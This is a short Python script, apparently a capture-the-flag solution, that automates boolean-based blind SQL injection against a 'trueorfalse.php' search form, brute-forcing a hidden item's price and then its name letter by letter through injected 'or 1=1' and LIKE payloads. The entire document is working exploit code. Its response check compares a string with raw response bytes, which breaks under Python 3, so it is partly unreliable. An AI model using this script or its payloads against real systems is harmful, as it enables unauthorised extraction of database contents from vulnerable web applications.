# Working script to solve challenge

import requests
import string 

perm = string.ascii_uppercase + string.digits
url = "http://<url>:3004/trueorfalse.php"
itemname = ""
price = ""
counter = 99

while True:		
	counter +=1
	injectQuery = '\' or 1=1 and price = ' + str(counter) + '#'
	payload = {'search': injectQuery}
	html = requests.post(url, data=payload)
	if "This item exists" in html.content:
		while True:
			for i in perm:	
				injectQuery = '\' or name like \'' + itemname+i + '%\'' + ' and price = ' + str(counter) + '#'
				payload = {'search': injectQuery }
				html = requests.post(url, data=payload)
				print ("Currently checking: %s" % (itemname))
				if "This item exists" in html.content:
					itemname += i
					injectQuery = itemname + '\' and price = ' + str(counter) + '#'
					payload = {'search': injectQuery}
					html = requests.post(url, data=payload)
					if "This item exists" in html.content:
						print("Name of item: %s" % itemname)
						print ("Price of item: %s" % counter)
						exit()
